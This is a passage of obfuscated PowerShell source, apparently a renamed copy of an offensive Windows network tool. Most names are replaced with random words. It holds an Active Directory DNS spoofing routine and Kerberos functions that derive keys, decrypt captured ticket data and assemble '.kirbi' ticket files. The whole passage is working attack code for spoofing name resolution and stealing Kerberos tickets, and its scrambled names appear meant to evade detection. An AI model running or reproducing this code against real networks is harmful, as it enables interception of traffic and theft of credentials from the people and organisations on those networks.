            {
                [Byte[]]$EwqahtNM99 = 0x10,0x00
                [Byte[]]$KkbNtUVv99 = ([System.BitConverter]::GetBytes($Data.Length + 1))[0..1]
                [Byte[]]$PCsVUoAt99 = $Data.Length
                $PCsVUoAt99 += [System.Text.Encoding]::UTF8.GetBytes($Data)
            }
        }
        
        [Byte[]]$dirBPHtS99 = [System.BitConverter]::GetBytes($TTL)
        [Byte[]]$vLwGYkrJ99 = $KkbNtUVv99 +
            $EwqahtNM99 +
            0x05,0xF0,0x00,0x00 +
            $MPIpbeHu99[0..3] +
            $dirBPHtS99[3..0] +
            0x00,0x00,0x00,0x00
        if($DUHyGjyn99)
        {
            $vLwGYkrJ99 += 0x00,0x00,0x00,0x00
        }
        else
        {
            $CoaJGbFq99 = [Int64](([Datetime]::UtcNow)-(Get-Date "1/1/1601")).TotalHours
            $CoaJGbFq99 = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($CoaJGbFq99))
            $CoaJGbFq99 = $CoaJGbFq99.Split("-") | ForEach-Object{[System.Convert]::ToInt16($_,16)}
            $CoaJGbFq99 = $CoaJGbFq99[0..3]
            $vLwGYkrJ99 += $CoaJGbFq99
        }
        
        $vLwGYkrJ99 += $PCsVUoAt99
        return ,$vLwGYkrJ99
    }
    function visioned
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$Data,
            [parameter(Mandatory=$false)][String]$gJEKQvQm99,
            [parameter(Mandatory=$false)][String]$WSnjjaRO99,
            [parameter(Mandatory=$false)][String]$MCxnfbXk99,
            [parameter(Mandatory=$true)][String]$Node,
            [parameter(Mandatory=$false)][String]$iZRypARs99,
            [parameter(Mandatory=$false)][String]$Type,
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][Int]$TTL,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$agAaKWoK99
        )
        try
        {
            $VuJagKwP99 = creatively -agAaKWoK99 $agAaKWoK99 -Data $Data -gJEKQvQm99 $gJEKQvQm99 -WSnjjaRO99 $WSnjjaRO99 -MCxnfbXk99 $MCxnfbXk99 -Node $Node -iZRypARs99 $iZRypARs99 -Type $Type -TTL $TTL -Zone $Zone
            if($wzCNZfgp99.ADIDNS -and !$VuJagKwP99)
            {
                $xbhIIkCL99 = loudmouthed -agAaKWoK99 $agAaKWoK99 -gJEKQvQm99 $gJEKQvQm99 -WSnjjaRO99 $WSnjjaRO99 -Node $Node -iZRypARs99 $iZRypARs99 -Zone $Zone
                if($xbhIIkCL99)
                {
                    berated -agAaKWoK99 $agAaKWoK99 -Data $Data -gJEKQvQm99 $gJEKQvQm99 -WSnjjaRO99 $WSnjjaRO99 -Node $Node -iZRypARs99 $iZRypARs99 -Type $Type -TTL $TTL -Zone $Zone
                }
            }
        }
        catch
        {
            $kRjlpgSh99 = $_.Exception.Message
            $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
            $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
            $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS spoofer disabled due to error") > $null
            $wzCNZfgp99.ADIDNS = $null
        }
    }
    function greeted
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][Array]$oxLMfbyI99,
            [parameter(Mandatory=$false)][String]$Data,
            [parameter(Mandatory=$false)][String]$gJEKQvQm99,
            [parameter(Mandatory=$false)][String]$WSnjjaRO99,
            [parameter(Mandatory=$false)][String]$MCxnfbXk99,
            [parameter(Mandatory=$false)]$iZRypARs99,
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][Int]$jkBrOZtA99,
            [parameter(Mandatory=$false)][Int]$TTL,
            [parameter(Mandatory=$false)]$MTBtHdVN99,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$agAaKWoK99
        )
        Start-Sleep -S 1
        foreach($JOzGoKyf99 in $MTBtHdVN99.Keys)
        {
            if(($MTBtHdVN99.$JOzGoKyf99 | Sort-Object -Unique).Count -gt $jkBrOZtA99)
            {
                if(!$wzCNZfgp99.ADIDNS_table.ContainsKey($JOzGoKyf99))
                {
                    $wzCNZfgp99.ADIDNS_table.Add($JOzGoKyf99,"")
                }
                
                if($oxLMfbyI99 -NotContains $JOzGoKyf99 -and !$wzCNZfgp99.ADIDNS_table.$JOzGoKyf99)
                {    
                    visioned -agAaKWoK99 $agAaKWoK99 -Data $Data -gJEKQvQm99 $gJEKQvQm99 -WSnjjaRO99 $WSnjjaRO99 -MCxnfbXk99 $MCxnfbXk99 -Node $JOzGoKyf99 -iZRypARs99 $iZRypARs99 -Type 'A' -TTL $TTL -Zone $Zone
                }
                elseif($oxLMfbyI99 -Contains $JOzGoKyf99)
                {
                    if(!$wzCNZfgp99.ADIDNS_table.$JOzGoKyf99)
                    {
                        $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS combo attack ignored $JOzGoKyf99") > $null
                        $wzCNZfgp99.ADIDNS_table.$JOzGoKyf99 = 3
                    }
                }
            }
            
            Start-Sleep -m 10
        }
    }
}
$RZtmuZMB99 = 
{
    function itemization
    {
        param([String]$salt,[System.Security.SecureString]$GWtyGamO99)
        $TGwLOINa99 = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($GWtyGamO99)
        $SIwBCkEA99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($TGwLOINa99)
        [Byte[]]$salt = [System.Text.Encoding]::UTF8.GetBytes($salt)
        [Byte[]]$SIwBCkEA99 = [System.Text.Encoding]::UTF8.GetBytes($SIwBCkEA99)
        $IhxYHTMn99 = 0x6B,0x65,0x72,0x62,0x65,0x72,0x6F,0x73,0x7B,0x9B,0x5B,0x2B,0x93,0x13,0x2B,0x93,0x5C,0x9B,0xDC,0xDA,0xD9,0x5C,0x98,0x99,0xC4,0xCA,0xE4,0xDE,0xE6,0xD6,0xCA,0xE4
        $XkBffiEg99 = New-Object Security.Cryptography.Rfc2898DeriveBytes($SIwBCkEA99,$salt,4096)
        Remove-Variable password_cleartext
        $TjLnbEvA99 = $XkBffiEg99.GetBytes(32)
        $AES = New-Object "System.Security.Cryptography.AesManaged"
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::None
        $AES.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
        $AES.KeySize = 256
        $AES.Key = $TjLnbEvA99
        $zLhRFwpr99 = $AES.CreateEncryptor()
        $yYdjvQZu99 = $zLhRFwpr99.TransformFinalBlock($IhxYHTMn99,0,$IhxYHTMn99.Length)
        $RVwPFUVm99 = $zLhRFwpr99.TransformFinalBlock($yYdjvQZu99,0,$yYdjvQZu99.Length)
        $fWvUFlkE99 = $yYdjvQZu99[0..15] + $RVwPFUVm99[0..15]
        return $fWvUFlkE99
    }
    function uncivilized
    {
        param([String]$ZgxmAOMz99,[Int]$snpzwJdt99,[Byte[]]$fWvUFlkE99)
        $qsZEqQJJ99 = 0x00 * 16
        if($ZgxmAOMz99 -eq 'checksum')
        {
            switch($snpzwJdt99) 
            {
                25 {[Byte[]]$WBhmCGub99 = 0x5d,0xfb,0x7d,0xbf,0x53,0x68,0xce,0x69,0x98,0x4b,0xa5,0xd2,0xe6,0x43,0x34,0xba + $qsZEqQJJ99}
            }
        }
        elseif($ZgxmAOMz99 -eq 'encrypt')
        {
            switch($snpzwJdt99) 
            {
                1 {[Byte[]]$WBhmCGub99 = 0xae,0x2c,0x16,0x0b,0x04,0xad,0x50,0x06,0xab,0x55,0xaa,0xd5,0x6a,0x80,0x35,0x5a + $qsZEqQJJ99}
                2 {[Byte[]]$WBhmCGub99 = 0xb5,0xb0,0x58,0x2c,0x14,0xb6,0x50,0x0a,0xad,0x56,0xab,0x55,0xaa,0x80,0x55,0x6a + $qsZEqQJJ99}
                3 {[Byte[]]$WBhmCGub99 = 0xbe,0x34,0x9a,0x4d,0x24,0xbe,0x50,0x0e,0xaf,0x57,0xab,0xd5,0xea,0x80,0x75,0x7a + $qsZEqQJJ99}
                4 {[Byte[]]$WBhmCGub99 = 0xc5,0xb7,0xdc,0x6e,0x34,0xc7,0x51,0x12,0xb1,0x58,0xac,0x56,0x2a,0x80,0x95,0x8a + $qsZEqQJJ99}
                7 {[Byte[]]$WBhmCGub99 = 0xde,0x44,0xa2,0xd1,0x64,0xe0,0x51,0x1e,0xb7,0x5b,0xad,0xd6,0xea,0x80,0xf5,0xba + $qsZEqQJJ99}
                11 {[Byte[]]$WBhmCGub99 = 0xfe,0x54,0xaa,0x55,0xa5,0x02,0x52,0x2f,0xbf,0x5f,0xaf,0xd7,0xea,0x81,0x75,0xfa + $qsZEqQJJ99}
                12 {[Byte[]]$WBhmCGub99 = 0x05,0xd7,0xec,0x76,0xb5,0x0b,0x53,0x33,0xc1,0x60,0xb0,0x58,0x2a,0x81,0x96,0x0b + $qsZEqQJJ99}
                14 {[Byte[]]$WBhmCGub99 = 0x15,0xe0,0x70,0xb8,0xd5,0x1c,0x53,0x3b,0xc5,0x62,0xb1,0x58,0xaa,0x81,0xd6,0x2b + $qsZEqQJJ99}
            }
                
        }
        elseif($ZgxmAOMz99 -eq 'integrity') 
        {
            
            switch($snpzwJdt99) 
            {
                1 {[Byte[]]$WBhmCGub99 = 0x5b,0x58,0x2c,0x16,0x0a,0x5a,0xa8,0x05,0x56,0xab,0x55,0xaa,0xd5,0x40,0x2a,0xb5 + $qsZEqQJJ99}
                4 {[Byte[]]$WBhmCGub99 = 0x72,0xe3,0xf2,0x79,0x3a,0x74,0xa9,0x11,0x5c,0xae,0x57,0x2b,0x95,0x40,0x8a,0xe5 + $qsZEqQJJ99}
                7 {[Byte[]]$WBhmCGub99 = 0x8b,0x70,0xb8,0xdc,0x6a,0x8d,0xa9,0x1d,0x62,0xb1,0x58,0xac,0x55,0x40,0xeb,0x15 + $qsZEqQJJ99}
                11 {[Byte[]]$WBhmCGub99 = 0xab,0x80,0xc0,0x60,0xaa,0xaf,0xaa,0x2e,0x6a,0xb5,0x5a,0xad,0x55,0x41,0x6b,0x55 + $qsZEqQJJ99}
            }
        }
        $AES = New-Object "System.Security.Cryptography.AesManaged"
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $AES.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
        $AES.KeySize = 256
        $AES.Key = $fWvUFlkE99
        $zLhRFwpr99 = $AES.CreateEncryptor()
        $tZLifgVb99 = $zLhRFwpr99.TransformFinalBlock($WBhmCGub99,0,$WBhmCGub99.Length)
        return $tZLifgVb99
    }
    function rawhide
    {
        param ([Byte[]]$asn1)
    
        $i = 0
    
        while ($asn1[$i] -ne 3 -and $asn1[$i] -ne 129 -and $asn1[$i] -ne 130 -and $asn1[$i] -ne 131 -and $asn1[$i] -ne 132 -and $i -lt 1)
        {
            $i++   
        }
    
        switch ($asn1[$i]) 
        {
            
            3
            { 
                $i += 3 
                $IsUQwhEP99 = $asn1[$i]
                $i++
            }
    
            129
            {
                $i += 1
                $IsUQwhEP99 = $asn1[$i]
                $i++
            }
    
            130
            {
                $i += 2
                $IsUQwhEP99 = articulations 0 $asn1[($i)..($i - 1)]
                $i++
            }
    
            131
            {
                $i += 3
                $IsUQwhEP99 = jockstraps 0 ($asn1[($i)..($i - 2)] + 0x00)
                $i++
            }
    
            132
            {
                $i += 4
                $IsUQwhEP99 = jockstraps 0 $asn1[($i)..($i - 3)]
                $i++
            }
    
        }
    
        return $i,$IsUQwhEP99
    }
    function Jockey
    {
        param([Byte[]]$NcyTFCBp99,[Byte[]]$jtLznGxh99)
        $yOZzYYdw99 = [Math]::Truncate($jtLznGxh99.Count % 16)
        [Byte[]]$oJHbEPSQ99 = $jtLznGxh99[($jtLznGxh99.Count - $yOZzYYdw99)..$jtLznGxh99.Count]
        [Byte[]]$ZzszBscO99 = $jtLznGxh99[($jtLznGxh99.Count - $yOZzYYdw99 - 16)..($jtLznGxh99.Count - $yOZzYYdw99 - 1)]
        $AES = New-Object "System.Security.Cryptography.AesManaged"
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $AES.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
        $AES.KeySize = 256
        $AES.Key = $NcyTFCBp99
        $LjxXhkXF99 = $AES.CreateDecryptor()
        $DIfLsQkw99 = $LjxXhkXF99.TransformFinalBlock($ZzszBscO99,0,$ZzszBscO99.Length)
        [Byte[]]$OzgJBNdu99 = $DIfLsQkw99[$yOZzYYdw99..$DIfLsQkw99.Count]
        $oJHbEPSQ99 += $OzgJBNdu99
        [Byte[]]$vyKKJCLT99 = $jtLznGxh99[0..($jtLznGxh99.Count - $yOZzYYdw99 - 17)] + $oJHbEPSQ99 + $ZzszBscO99
        [Byte[]]$DvPxUzVp99 = $LjxXhkXF99.TransformFinalBlock($vyKKJCLT99,0,$vyKKJCLT99.Length)
        return $DvPxUzVp99
    }
    function sensitivities
    {
        param([Byte[]]$hHojoQYY99,[Byte[]]$iSKlFFLm99)
    
        [Byte[]]$kirbi = $hHojoQYY99 + $iSKlFFLm99
        $kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
        $kirbi = 0x76,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
    
        return $kirbi
    }
    function statelier
    {
        param([Byte[]]$DvPxUzVp99)
    
        $ASN1 = rawhide $DvPxUzVp99[4..9]
        $XfmLEGQp99 = $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + 4)..($XfmLEGQp99 + 9)]
        $XfmLEGQp99 += $ASN1[0]
        $AqtJsuyo99 = $DvPxUzVp99[($XfmLEGQp99 + 7)]
        $lotubXLF99 = $DvPxUzVp99[($XfmLEGQp99 + $AqtJsuyo99 + 22)]
        $wCFWIksz99 = $AqtJsuyo99 + $lotubXLF99
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 74)..($XfmLEGQp99 + $wCFWIksz99 + 79)]
        $XfmLEGQp99 += $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 74)..($XfmLEGQp99 + $wCFWIksz99 + 79)]
        $XfmLEGQp99 += $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 74)..($XfmLEGQp99 + $wCFWIksz99 + 79)]
        $XfmLEGQp99 += $ASN1[0]
        $pvno = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 73)]
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 74)..($XfmLEGQp99 + $wCFWIksz99 + 79)]
        $XfmLEGQp99 += $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 74)..($XfmLEGQp99 + $wCFWIksz99 + 79)]
        $XfmLEGQp99 += $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 74)..($XfmLEGQp99 + $wCFWIksz99 + 79)]
        $XfmLEGQp99 += $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 74)..($XfmLEGQp99 + $wCFWIksz99 + 79)]
        $XfmLEGQp99 += $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 74)..($XfmLEGQp99 + $wCFWIksz99 + 79)]
        $XfmLEGQp99 += $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 74)..($XfmLEGQp99 + $wCFWIksz99 + 79)]
        $XfmLEGQp99 += $ASN1[0]
        $erqNozDP99 = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 73)]
        $pdfWpkJe99 = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 75)]
        [Byte[]]$AtpQmkkU99 = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 76)..($XfmLEGQp99 + $wCFWIksz99 + $pdfWpkJe99 + 75)]
        $wCFWIksz99 += $pdfWpkJe99
        $DLCUyTzl99 = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 88)]
        [Byte[]]$kqoOypxN99 = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 89)..($XfmLEGQp99 + $wCFWIksz99 + $DLCUyTzl99 + 88)]
        $wCFWIksz99 += $DLCUyTzl99
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 89)..($XfmLEGQp99 + $wCFWIksz99 + 94)]
        $XfmLEGQp99 += $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 89)..($XfmLEGQp99 + $wCFWIksz99 + 94)]
        $XfmLEGQp99 += $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 89)..($XfmLEGQp99 + $wCFWIksz99 + 94)]
        $XfmLEGQp99 += $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 89)..($XfmLEGQp99 + $wCFWIksz99 + 94)]
        $XfmLEGQp99 += $ASN1[0]
        $kvno = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 88)]
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 89)..($XfmLEGQp99 + $wCFWIksz99 + 94)]
        $XfmLEGQp99 += $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 89)..($XfmLEGQp99 + $wCFWIksz99 + 94)]
        $XfmLEGQp99 += $ASN1[0]
        $ippLnOph99 = $ASN1[1]
        [Byte[]]$FUCAPxQy99 = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 89)..($XfmLEGQp99 + $wCFWIksz99 + $ippLnOph99 + 88)]
        [Byte[]]$kirbi = 0x04,0x82 + [System.BitConverter]::GetBytes($FUCAPxQy99.Count)[1..0] + $FUCAPxQy99
        $kirbi = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
        $kirbi = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12,0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $kvno + $kirbi
        $kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
        $kirbi = 0xA3,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
        [Byte[]]$hHojoQYY99 = 0x30,0x84 + [System.BitConverter]::GetBytes($kqoOypxN99.Count)[3..0] + $kqoOypxN99
        $hHojoQYY99 = 0xA1,0x84 + [System.BitConverter]::GetBytes($hHojoQYY99.Count)[3..0] + $hHojoQYY99
        $hHojoQYY99 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + $hHojoQYY99
        $hHojoQYY99 = 0x30,0x84 + [System.BitConverter]::GetBytes($hHojoQYY99.Count)[3..0] + $hHojoQYY99
        $hHojoQYY99 = 0xA2,0x84 + [System.BitConverter]::GetBytes($hHojoQYY99.Count)[3..0] + $hHojoQYY99
        [Byte[]]$iSKlFFLm99 = 0xA1,0x84 + [System.BitConverter]::GetBytes($AtpQmkkU99.Count)[3..0] + $AtpQmkkU99
        $iSKlFFLm99 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $erqNozDP99 + $iSKlFFLm99
        [Byte[]]$wytRjBNR99 = $iSKlFFLm99 + $hHojoQYY99 + $kirbi
        $wytRjBNR99 = 0x30,0x84 + [System.BitConverter]::GetBytes($wytRjBNR99.Count)[3..0] + $wytRjBNR99
        $wytRjBNR99 = 0x61,0x84 + [System.BitConverter]::GetBytes($wytRjBNR99.Count)[3..0] + $wytRjBNR99
        $wytRjBNR99 = 0x30,0x84 + [System.BitConverter]::GetBytes($wytRjBNR99.Count)[3..0] + $wytRjBNR99
        $wytRjBNR99 = 0xA2,0x84 + [System.BitConverter]::GetBytes($wytRjBNR99.Count)[3..0] + $wytRjBNR99
        $wytRjBNR99 = 0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x16 + $wytRjBNR99
        $wytRjBNR99 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $pvno + $wytRjBNR99
    
        return $wytRjBNR99
    }
    
    function defies
    {
        param([Byte[]]$DvPxUzVp99)
    
        $ASN1 = rawhide $DvPxUzVp99[0..($XfmLEGQp99 + 5)]
        $XfmLEGQp99 = $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[$XfmLEGQp99..($XfmLEGQp99 + 5)]
        $XfmLEGQp99 += $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[$XfmLEGQp99..($XfmLEGQp99 + 5)]
        $XfmLEGQp99 += $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[$XfmLEGQp99..($XfmLEGQp99 + 5)]
        $XfmLEGQp99 += $ASN1[0]
        $ASN1 = rawhide $DvPxUzVp99[$XfmLEGQp99..($XfmLEGQp99 + 5)]
        $XfmLEGQp99 += $ASN1[0]
        [Byte[]]$key = $DvPxUzVp99[($XfmLEGQp99 + 11)..($XfmLEGQp99 + 44)]
        $OrmHFgel99 = $DvPxUzVp99[($XfmLEGQp99 + 46)]
        [Byte[]]$gfgrrwhn99 = $DvPxUzVp99[($XfmLEGQp99 + 47)..($XfmLEGQp99 + $OrmHFgel99 + 46)]
        $EDNkGcjW99 = $DvPxUzVp99[($XfmLEGQp99 + $OrmHFgel99 + 59)]
        $wCFWIksz99 = $OrmHFgel99 + $EDNkGcjW99
        [Byte[]]$pname = $DvPxUzVp99[($XfmLEGQp99 + $OrmHFgel99 + 60)..($XfmLEGQp99 + $wCFWIksz99 + 59)]
        [Byte[]]$flags = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 65)..($XfmLEGQp99 + $wCFWIksz99 + 68)]
        [Byte[]]$jrqilPjc99 = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 71)..($XfmLEGQp99 + $wCFWIksz99 + 87)]
        [Byte[]]$ErMmiycz99 = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 90)..($XfmLEGQp99 + $wCFWIksz99 + 106)]
        [Byte[]]$RYxAiUzR99 = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 109)..($XfmLEGQp99 + $wCFWIksz99 + 125)]
        $wwIxSSrY99 = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 127)]
        [Byte[]]$VrMcdKgL99 = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 128)..($XfmLEGQp99 + $wCFWIksz99 + $wwIxSSrY99 + 127)]
        $wCFWIksz99 += $wwIxSSrY99
        $DLCUyTzl99 = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 140)]
        [Byte[]]$kqoOypxN99 = $DvPxUzVp99[($XfmLEGQp99 + $wCFWIksz99 + 141)..($XfmLEGQp99 + $wCFWIksz99 + $DLCUyTzl99 + 140)]
        [Byte[]]$kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($kqoOypxN99.Count)[3..0] + $kqoOypxN99
        $kirbi = 0xA1,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
        $kirbi = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + $kirbi
        $kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
        $kirbi = 0xA9,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
        $kirbi = 0xA8,0x84 + [System.BitConverter]::GetBytes($VrMcdKgL99.Count)[3..0] + $VrMcdKgL99 + $kirbi
        $kirbi = 0xA7,0x84 + [System.BitConverter]::GetBytes($RYxAiUzR99.Count)[3..0] + $RYxAiUzR99 + $kirbi
        $kirbi = 0xA6,0x84 + [System.BitConverter]::GetBytes($ErMmiycz99.Count)[3..0] + $ErMmiycz99 + $kirbi
        $kirbi = 0xA5,0x84 + [System.BitConverter]::GetBytes($jrqilPjc99.Count)[3..0] + $jrqilPjc99 + $kirbi
        $kirbi = 0xA3,0x84,0x00,0x00,0x00,0x07,0x03,0x05,0x00 + $flags + $kirbi
        [Byte[]]$hHojoQYY99 = 0x30,0x84 + [System.BitConverter]::GetBytes($pname.Count)[3..0] + $pname
        $hHojoQYY99 = 0xA1,0x84 + [System.BitConverter]::GetBytes($hHojoQYY99.Count)[3..0] + $hHojoQYY99
        $hHojoQYY99 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x01 + $hHojoQYY99
        $hHojoQYY99 = 0x30,0x84 + [System.BitConverter]::GetBytes($hHojoQYY99.Count)[3..0] + $hHojoQYY99
        $hHojoQYY99 = 0xA2,0x84 + [System.BitConverter]::GetBytes($hHojoQYY99.Count)[3..0] + $hHojoQYY99
        $hHojoQYY99 = 0xA1,0x84 + [System.BitConverter]::GetBytes($gfgrrwhn99.Count)[3..0] + $gfgrrwhn99 + $hHojoQYY99
        [Byte[]]$iSKlFFLm99 = 0xA1,0x84 + [System.BitConverter]::GetBytes($key.Count)[3..0] + $key
        $iSKlFFLm99 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12 + $iSKlFFLm99
        $iSKlFFLm99 = 0x30,0x84 + [System.BitConverter]::GetBytes($iSKlFFLm99.Count)[3..0] + $iSKlFFLm99
        $iSKlFFLm99 = 0xA0,0x84 + [System.BitConverter]::GetBytes($iSKlFFLm99.Count)[3..0] + $iSKlFFLm99
        [Byte[]]$wytRjBNR99 = $iSKlFFLm99 + $hHojoQYY99 + $kirbi
        $wytRjBNR99 = 0x30,0x84 + [System.BitConverter]::GetBytes($wytRjBNR99.Count)[3..0] + $wytRjBNR99
        $wytRjBNR99 = 0x30,0x84 + [System.BitConverter]::GetBytes($wytRjBNR99.Count)[3..0] + $wytRjBNR99
        $wytRjBNR99 = 0xA0,0x84 + [System.BitConverter]::GetBytes($wytRjBNR99.Count)[3..0] + $wytRjBNR99
        $wytRjBNR99 = 0x30,0x84 + [System.BitConverter]::GetBytes($wytRjBNR99.Count)[3..0] + $wytRjBNR99
        $wytRjBNR99 = 0x7D,0x84 + [System.BitConverter]::GetBytes($wytRjBNR99.Count)[3..0] + $wytRjBNR99
        $wytRjBNR99 = 0x04,0x82 + [System.BitConverter]::GetBytes($wytRjBNR99.Count)[1..0] + $wytRjBNR99
        $wytRjBNR99 = 0xA2,0x84 + [System.BitConverter]::GetBytes($wytRjBNR99.Count)[3..0] + $wytRjBNR99
        $wytRjBNR99 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x00 + $wytRjBNR99
        $wytRjBNR99 = 0x30,0x84 + [System.BitConverter]::GetBytes($wytRjBNR99.count)[3..0] + $wytRjBNR99
        $wytRjBNR99 = 0xA3,0x84 + [System.BitConverter]::GetBytes($wytRjBNR99.count)[3..0] + $wytRjBNR99
    
        return $wytRjBNR99
    }
    function saddles
    {
        param([Byte[]]$data,[Byte[]]$fWvUFlkE99,[String]$CavJYakf99,[String]$PFOuglCK99,[String]$lnnWyXyw99)
        $NPTdRYuo99 = [System.BitConverter]::ToString($data)
        $NPTdRYuo99 = $NPTdRYuo99 -replace "-",""
        $dMPSfQFN99 = $NPTdRYuo99.IndexOf("A003020112A1030201")
        if($dMPSfQFN99 -ge 0)
        {
            $ASN1 = rawhide $data[($dMPSfQFN99 / 2 + 10)..($dMPSfQFN99 / 2 + 15)]
            $XfmLEGQp99 = $ASN1[0]
            $ASN1 = rawhide $data[($dMPSfQFN99 / 2 + $XfmLEGQp99 + 10)..($dMPSfQFN99 / 2 + $XfmLEGQp99 + 15)]
            $XfmLEGQp99 += $ASN1[0]
            $ippLnOph99 = $ASN1[1]
            [Byte[]]$FUCAPxQy99 = $data[($dMPSfQFN99 / 2 + $XfmLEGQp99 + 10)..($dMPSfQFN99 / 2 + $XfmLEGQp99 + $ippLnOph99 + 9)]
            [Byte[]]$NcyTFCBp99 = uncivilized encrypt 2 $fWvUFlkE99
            [Byte[]]$DvPxUzVp99 = Jockey $NcyTFCBp99 $FUCAPxQy99[0..($FUCAPxQy99.Count - 13)]
            $DvPxUzVp99 = $DvPxUzVp99[16..$DvPxUzVp99.Count]
            $qHBiOlsp99 = [System.BitConverter]::ToString($DvPxUzVp99)
            $qHBiOlsp99 = $qHBiOlsp99 -replace "-",""
            $dMPSfQFN99 = $qHBiOlsp99.IndexOf("A003020112A1")
            if($dMPSfQFN99 -ge 0)
            {
                [Byte[]]$xjrnXmHa99 = $DvPxUzVp99[30..61]
                [Byte[]]$NcyTFCBp99 = uncivilized encrypt 11 $xjrnXmHa99
                $dMPSfQFN99 = $NPTdRYuo99.IndexOf("A003020112A2")
                if($dMPSfQFN99 -ge 0)
                {
                    $ASN1 = rawhide $data[($dMPSfQFN99 / 2 + 5)..($dMPSfQFN99 / 2 + 10)]
                    $XfmLEGQp99 = $ASN1[0]
